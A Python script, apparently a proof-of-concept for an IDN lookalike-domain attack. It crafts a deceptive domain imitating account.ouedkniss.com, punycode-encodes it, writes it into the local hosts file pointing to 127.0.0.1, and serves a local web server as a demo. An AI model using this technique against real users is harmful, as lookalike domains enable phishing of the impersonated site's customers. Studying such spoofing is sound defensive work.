#!/usr/bin/env python3
import idna
import os
import sys
import subprocess
import time

def hosts_entry_exists(domain):
    try:
        if os.name == 'posix':  # Linux/Mac
            hosts_file = '/etc/hosts'
        else:  # Windows
            hosts_file = r'C:\Windows\System32\drivers\etc\hosts'
        
        with open(hosts_file, 'r') as f:
            content = f.read()
            
        entry_to_find = f"127.0.0.1 {domain}"
        return entry_to_find in content
        
    except Exception as e:
        print(f"[-] Error reading hosts file: {e}")
        return False

def setup_idn_attack():
    # Define malicious domain
    malicious_domain = "account.ouedkniss.comんdetailんrestric-access.www-account-ouedkniss.com"
    
    # Encode domain
    encoded_domain = idna.encode(malicious_domain).decode('ascii')
    print(f"[+] Encoded domain: {encoded_domain}")
    
    # Add to hosts file
    hosts_entry = f"127.0.0.1 {encoded_domain}"
    
    try:
        if not hosts_entry_exists(encoded_domain): 
            if os.name == 'posix':  # Linux/Mac
                with open('/etc/hosts', 'a') as f:
                    f.write(f"\n{hosts_entry}")
                print("[+] Added to /etc/hosts")
            else:  
                hosts_path = r'C:\Windows\System32\drivers\etc\hosts'
                with open(hosts_path, 'a') as f:
                    f.write(f"\n{hosts_entry}")
                print("[+] Added to Windows hosts file")

        
        if os.name == 'posix':  # Linux/Mac
            process = subprocess.Popen(['python3', '-m', 'http.server', '80'], 
                                      stdout=subprocess.PIPE, 
                                      stderr=subprocess.PIPE, 
                                      preexec_fn=os.setpgrp
                                     )
        else:  # Windows
            process = subprocess.Popen(['python', '-m', 'http.server', '80'],
                                      stdout=subprocess.PIPE,
                                      stderr=subprocess.PIPE,
                                      creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
    
        time.sleep(2)  

        if process.poll() is None:
            print("[+] Web server started on port 80")
        else:
            print("[-] Failed to start web server.")
            sys.exit(1)

        print(f"[+] Demo URL: http://{malicious_domain}/")
        print(f"[+] Server is running. Press Ctrl+C to stop.")
        
        # Keep the script running so the server stays active
        try:
            process.wait()
        except KeyboardInterrupt:
            print("\n[-] Server stopped by user")
            process.terminate()
            sys.exit(0)
        
    except PermissionError:
        print("[-] Error: Run script as administrator/root")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error starting web server: {e}")

if __name__ == "__main__":
    setup_idn_attack()